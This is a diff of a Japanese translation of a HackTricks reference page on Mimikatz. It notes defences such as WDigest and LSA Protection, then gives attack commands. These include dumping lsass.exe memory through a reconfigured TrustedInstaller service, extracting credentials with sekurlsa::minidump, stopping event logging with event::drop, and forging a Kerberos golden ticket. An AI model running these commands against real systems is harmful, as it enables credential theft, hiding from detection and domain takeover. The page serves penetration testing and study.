@@ -2,38 +2,38 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-* **ハッキングトリックを共有するには、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングトリックを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
 
 </details>
 
-**このページは[adsecurity.org](https://adsecurity.org/?page\_id=1821)のものに基づいています**。詳細については元のページをご確認ください！
+**このページは[adsecurity.org](https://adsecurity.org/?page\_id=1821)のページを元にしています**。詳細については元のページをご確認ください！
 
 ## メモリ内のLMハッシュとクリアテキスト
 
 Windows 8.1およびWindows Server 2012 R2以降、資格情報の盗難に対する重要な対策が実施されています：
 
-- **LMハッシュと平文パスワード**はセキュリティを強化するためにメモリに保存されなくなりました。"クリアテキスト"パスワードがLSASSにキャッシュされないようにするには、特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ にDWORD値`0`を設定する必要があります。
+- **LMハッシュと平文パスワード**はセキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ にDWORD値 `0` を設定してDigest認証を無効にし、LSASSに"クリアテキスト"パスワードがキャッシュされないようにする必要があります。
 
-- **LSA Protection**は、ローカルセキュリティ権限（LSA）プロセスを未承認のメモリ読み取りやコードインジェクションから保護するために導入されました。これはLSASSを保護されたプロセスとしてマークすることで実現されます。LSA Protectionの有効化には以下が必要です：
-1. `RunAsPPL`を`dword:00000001`に設定して、レジストリを_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_で変更する。
-2. これを管理されたデバイス全体に適用するグループポリシーオブジェクト（GPO）を実装する。
+- **LSA Protection**は、ローカルセキュリティ機関（LSA）プロセスを未承認のメモリ読み取りやコードインジェクションから保護するために導入されました。これはLSASSを保護されたプロセスとしてマークすることで実現されます。LSA Protectionの有効化には以下が必要です：
+1. `RunAsPPL` を `dword:00000001` に設定して、レジストリを _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ で変更します。
+2. このレジストリ変更を管理されたデバイス全体に強制するグループポリシーオブジェクト（GPO）を実装します。
 
-これらの保護措置にもかかわらず、MimikatzなどのツールはLSA Protectionを特定のドライバを使用して回避できますが、そのような行動はイベントログに記録される可能性があります。
+これらの保護策にもかかわらず、MimikatzなどのツールはLSA Protectionを特定のドライバを使用して回避できますが、そのような行動はイベントログに記録される可能性があります。
 
 ### SeDebugPrivilegeの削除に対抗する
 
-通常、管理者にはプログラムのデバッグを許可するSeDebugPrivilegeがあります。この権限は、攻撃者がメモリから資格情報を抽出するために使用する一般的なテクニックである無許可のメモリダンプを防ぐために制限できます。ただし、この権限が削除されていても、TrustedInstallerアカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます。
+通常、管理者にはプログラムのデバッグを許可するSeDebugPrivilegeがあります。この特権は、攻撃者がメモリから資格情報を抽出するために使用する一般的なテクニックである無許可のメモリダンプを防ぐために制限できます。ただし、この特権が削除されていても、TrustedInstallerアカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます。
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-以下は、`lsass.exe`メモリのダンプをファイルに保存し、そのファイルを別のシステムで解析して資格情報を抽出することを可能にします：
+これにより、`lsass.exe`のメモリをファイルにダンプし、その後別のシステムで分析して資格情報を抽出することができます。
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -41,20 +41,20 @@ sc start TrustedInstaller
 ```
 ## Mimikatzのオプション
 
-Mimikatzでのイベントログ改ざんには、主に2つのアクションが関与します: イベントログの消去と新しいイベントの記録を防ぐためにイベントサービスをパッチすることです。以下は、これらのアクションを実行するためのコマンドです:
+Mimikatzでのイベントログ改ざんには、主に2つのアクションが関与します：イベントログの消去と新しいイベントの記録を防ぐためにイベントサービスをパッチすることです。以下はこれらのアクションを実行するためのコマンドです：
 
 #### イベントログの消去
 
-- **コマンド**: このアクションは、イベントログを削除し、悪意のある活動を追跡するのを困難にします。
-- Mimikatzは、標準ドキュメントで直接的にコマンドラインを介してイベントログを消去するためのコマンドを提供していません。ただし、イベントログの操作は通常、Mimikatzの外部のシステムツールやスクリプトを使用して特定のログを消去することを含みます（例: PowerShellやWindowsイベントビューアを使用）。
+- **コマンド**：このアクションはイベントログを削除し、悪意のある活動を追跡するのを困難にします。
+- Mimikatzは、標準ドキュメントで直接イベントログを消去するためのコマンドを提供していません。ただし、イベントログの操作は通常、Mimikatzのコマンドラインを介して直接行うのではなく、特定のログを消去するためにシステムツールやスクリプトを使用することが一般的です（例：PowerShellやWindowsイベントビューアを使用）。
 
-#### 実験的な機能: イベントサービスのパッチ
+#### 実験的機能：イベントサービスのパッチ
 
-- **コマンド**: `event::drop`
+- **コマンド**：`event::drop`
 - この実験的なコマンドは、イベントログサービスの動作を変更し、新しいイベントの記録を防ぐように設計されています。
-- 例: `mimikatz "privilege::debug" "event::drop" exit`
+- 例：`mimikatz "privilege::debug" "event::drop" exit`
 
-- `privilege::debug`コマンドは、Mimikatzがシステムサービスを変更するために必要な特権で動作することを保証します。
+- `privilege::debug`コマンドは、Mimikatzがシステムサービスを変更するために必要な特権で動作することを確認します。
 - `event::drop`コマンドは、その後イベントログサービスをパッチします。
 
 
@@ -62,18 +62,18 @@ Mimikatzでのイベントログ改ざんには、主に2つのアクション�
 
 ### ゴールデンチケットの作成
 
-ゴールデンチケットは、ドメイン全体へのアクセス権限を与えることができます。主要なコマンドとパラメータ:
+ゴールデンチケットはドメイン全体へのアクセス権限を与えます。主要なコマンドとパラメータ：
 
-- コマンド: `kerberos::golden`
-- パラメータ:
-- `/domain`: ドメイン名。
-- `/sid`: ドメインのセキュリティ識別子（SID）。
-- `/user`: 擬似化するユーザー名。
-- `/krbtgt`: ドメインのKDCサービスアカウントのNTLMハッシュ。
-- `/ptt`: チケットを直接メモリに注入します。
-- `/ticket`: 後で使用するためにチケットを保存します。
+- コマンド：`kerberos::golden`
+- パラメータ：
+- `/domain`：ドメイン名。
+- `/sid`：ドメインのセキュリティ識別子（SID）。
+- `/user`：なりすますユーザー名。
+- `/krbtgt`：ドメインのKDCサービスアカウントのNTLMハッシュ。
+- `/ptt`：チケットを直接メモリに注入します。
+- `/ticket`：後で使用するためにチケットを保存します。
 
-例:
+例：
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
